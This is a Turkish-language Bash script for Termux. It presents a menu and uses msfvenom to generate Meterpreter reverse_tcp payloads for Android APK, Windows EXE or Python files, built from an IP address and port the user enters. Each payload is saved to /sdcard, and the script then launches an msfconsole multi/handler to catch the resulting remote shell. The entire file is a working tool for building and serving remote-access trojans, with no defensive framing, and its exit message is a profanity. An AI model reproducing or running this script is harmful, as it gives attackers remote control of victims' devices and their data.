#!/data/data/com.termux/bin/bash
#!/bin/bash
clear

banner(){
        echo -e '\e[32m
        #######################################################################################
  \e[32m      #                                                                                     #                                                                           
        #\e[31m[\e[37m01\e[31m]\e[37mAndroid  \e[31m[\e[37mtest.apk\e[31m]\e[37m\033[31;40;1m                                                       \e[32m       #
  \e[32m      #                                                                                     #        
        #\e[31m[\e[37m02\e[31m]\e[37mWindows  \e[31m[\e[37mtest.exe\e[31m]\e[37m\033[31;40;1m                                                       \e[32m       #
  \e[32m      #                                                                                     #        
        #\e[31m[\e[37m03\e[31m]\e[37mLinux    \e[31m[\e[37mtest.py\e[31m ]\e[37m\033[31;40;1m                                                       \e[32m       #
  \e[32m      #                                                                                     #               
        #######################################################################################


        \e[31m[\e[37m99\e[31m]\e[37mÇıkış\e[31m  [\e[37mExit\e[31m]\e[37m
        \e[31m[\e[37m00\e[31m]\e[37mMenü\e[31m   [\e[37mMenu\e[31m]\e[37m
        '

        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İşlem Numarası : ' islem_numarasi

}

banner

if [[ $islem_numarasi == 01 ||  $islem_numarasi == 1  ]]; then
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Ip Adresi : ' ip
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Port [2000 - 10000] : ' port
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Exploit Adı [ Uzantısız! ] : ' name
        msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port > /sdcard/$name.apk
        clear
        sleep 2
        echo -e '\e[37m
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        Dosyanız Hazır!
        Exploit -> /sdcard/'$name'.apk
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        '
        msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport $port ; exploit ;"

elif [[ $islem_numarasi == 02 ||  $islem_numarasi == 2  ]]; then
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Ip Adresi : ' ip
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Port [2000 - 10000] : ' port
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Exploit Adı [ Uzantısız! ] : ' name
        msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -f exe >  /sdcard/$name.exe
        clear
        sleep 2
        echo -e '\e[37m
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        Dosyanız Hazır!
        Exploit -> /sdcard/'$name'.exe
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        '
        msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport $port ; exploit ;"

elif [[ $islem_numarasi == 03 ||  $islem_numarasi == 3  ]]; then
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Ip Adresi : ' ip
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Port [2000 - 10000] : ' port
        echo -e ""
        read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Exploit Adı [ Uzantısız! ] : ' name
        msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=$port >  /sdcard/$name.py
        clear
        sleep 2
        echo -e '\e[37m
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        Dosyanız Hazır!
        Exploit -> /sdcard/'$name'.py
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        '
        msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport $port ; exploit ;"

elif [[ $islem_numarasi == 00 ||  $islem_numarasi == 0  ]]; then
        cd ../ && bash axl.sh

elif [[ $islem_numarasi == 99 ||  $islem_numarasi == 9  ]]; then
        clear
        echo -e "\e[37mSiktir git..."
        sleep 2
        clear
        exit
else
        cd .. && bash axl.sh
fi